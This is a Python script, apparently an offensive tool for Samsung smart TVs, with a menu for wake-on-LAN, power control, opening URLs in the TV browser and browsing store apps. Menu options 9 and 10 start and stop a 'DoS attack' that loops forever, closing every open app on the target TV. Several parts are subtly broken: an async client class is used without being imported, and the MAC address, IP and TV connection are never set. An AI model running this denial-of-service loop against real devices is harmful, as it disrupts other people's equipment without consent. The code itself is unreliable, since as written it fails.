import os
import re
import sys
import json
import socket
import base64
import urllib3
import asyncio
import requests
import warnings
import wakeonlan
from subprocess import Popen, PIPE
from samsungtvws import SamsungTVWS
from prettytable import PrettyTable
from scapy.all import ARP, Ether, srp
from samsungtvws.remote import SendRemoteKey

# Import the app script
from getSamsungTVStoreAppList import get_tv_apps, print_apps

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
banner = """
░▒▓████████▓▒░              ░▒▓▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░               ░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░  
░▒▓██████▓▒░▒▓█▓▒▒▓█▓▒░     ░▒▓▓▒░      ░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░  
░▒▓█▓▒░      ▒▓█▓▓█▓▒░░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░     ░▒▓█▓▓█▓▒░   
░▒▓█▓▒░      ▒▓█▓▓█▓▒░░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░     ░▒▓█▓▓█▓▒░   
░▒▓████████▓▒░▒▓██▓▒░ ░▒▓█▓▒░▒▓████▓▒░  ░▒▓█▓▒░      ░▒▓██▓▒░    
 
                By: Jordi Serrano @j0rd1s3rr4n0                  
"""

class SamsungTVController:
    def __init__(self):
        self.device_info = {}
        self.ip = None
        self.tv = None
        self.dos_task = None
        self.dos_running = False
        self.apps_data = []  # To store the app list

    async def close_all_apps(self):
        """Function to close all open apps on the TV."""
        apps = self.tv.app_list()
        for app in apps:
            app_id = app.get('appId', 'N/A')
            await self.tv.rest_app_stop(app_id)
            await asyncio.sleep(0.5)  # Avoid server overload

    async def dos(self):
        """Asynchronous function to close apps repeatedly until stopped."""
        self.dos_running = True
        while self.dos_running:
            print("Running DoS attack: Closing all applications.")
            await self.close_all_apps()
            await asyncio.sleep(1)  # Wait between attacks to simulate flood of requests.

    def start_dos(self):
        """Start the DoS in the background."""
        if not self.dos_task or self.dos_task.done():
            print("Starting DoS...")
            self.dos_task = asyncio.create_task(self.dos())

    def stop_dos(self):
        """Stop the background DoS."""
        if self.dos_task and not self.dos_task.done():
            print("Stopping DoS...")
            self.dos_running = False
            self.dos_task.cancel()

    async def sendCommand(self, algo, token_file):
        """Example of how to send commands to the TV."""
        tv = SamsungTVWSAsyncRemote(host=self.ip, port=8001, token_file=token_file)
        await tv.start_listening()
        await tv.send_command(SendRemoteKey.click("KEY_POWER"))
        await asyncio.sleep(15)
        await tv.close()

    def menu(self):
        """Main menu to interact with the TV."""
        while True:
            print("""
01) Display Device Info
02) WakeOnLAN
03) Power On/Off
04) Open URL
05) Applications
06) Send Command
07) View Available Apps
08) Select App to Install by APP ID
09) Start DoS
10) Stop DoS
99) Exit
            """)
            option = str(input("> "))

            if option == "1":
                print("Displaying device information.")
                # Logic to display device info can be added here

            elif option == "2":
                print("Sending WakeOnLAN packet...")
                wakeonlan.send_magic_packet(self.wifi_mac)

            elif option == "3":
                print("Turning TV On/Off...")
                self.tv.shortcuts().power()

            elif option == "4":
                url_to_open = input("Enter the URL to open: ")
                self.tv.open_browser(url_to_open)

            elif option == "5":
                apps = self.tv.app_list()
                self.display_apps_in_table(apps)

            elif option == "6":
                token_file = os.path.dirname(os.path.realpath(__file__)) + '/tv-token.txt'
                asyncio.run(self.sendCommand(algo="KEY_POWER", token_file=token_file))

            elif option == "7":
                offset = 0
                size = 50
                country = input("Enter the country code (default US): ").upper() or 'US'
                language = input("Enter the language code (default en): ").lower() or 'en'
                while True:
                    # Get and display the list of available apps
                    self.apps_data = get_tv_apps(country_code=country, language_code=language, offset=offset, size=size)
                    if self.apps_data:
                        print_apps(self.apps_data)
                    next_action = input("Do you want to see more apps? (Y/n): ")
                    offset += 50
                    size += 50
                    if next_action.lower() != 'y':
                        break

            elif option == "8":
                # Select an app by APP ID
                if not self.apps_data:
                    print("No apps loaded. Please view available apps first.")
                    continue

                app_id = input("Enter the APP ID of the app you want to install: ")
                app_selected = next((app for app in self.apps_data if str(app.get('appId')) == app_id), None)

                if app_selected:
                    print(f"Installing application: {app_selected.get('appName', 'Unknown')}")
                    # Logic to interact with the selected app can be added here
                else:
                    print(f"App with APP ID {app_id} not found.")

            elif option == "9":
                # Start DoS in the background
                asyncio.run(self.start_dos())

            elif option == "10":
                # Stop background DoS
                self.stop_dos()

            elif option == "99":
                print("Exiting...")
                exit(1)

if __name__ == "__main__":
    controller = SamsungTVController()
    controller.menu()
